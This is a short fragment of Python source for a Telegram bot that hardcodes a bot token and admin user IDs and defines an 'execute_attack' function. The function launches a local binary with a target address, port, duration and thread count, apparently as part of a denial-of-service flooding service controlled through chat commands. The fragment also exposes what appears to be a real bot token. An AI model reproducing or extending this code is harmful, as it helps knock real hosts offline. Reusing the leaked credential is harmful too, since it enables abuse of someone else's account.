...
bot = telebot.TeleBot('7485311734:AAGPoAi8APZQd3Z4qcSydMMXZ58xzWOY6o8')

# Admin user IDs
ADMIN_IDS = ["7320505224"]
...
async def execute_attack(target, port, duration):
    proc = await asyncio.create_subprocess_exec("./Kalua", target, str(port), str(duration), "100")
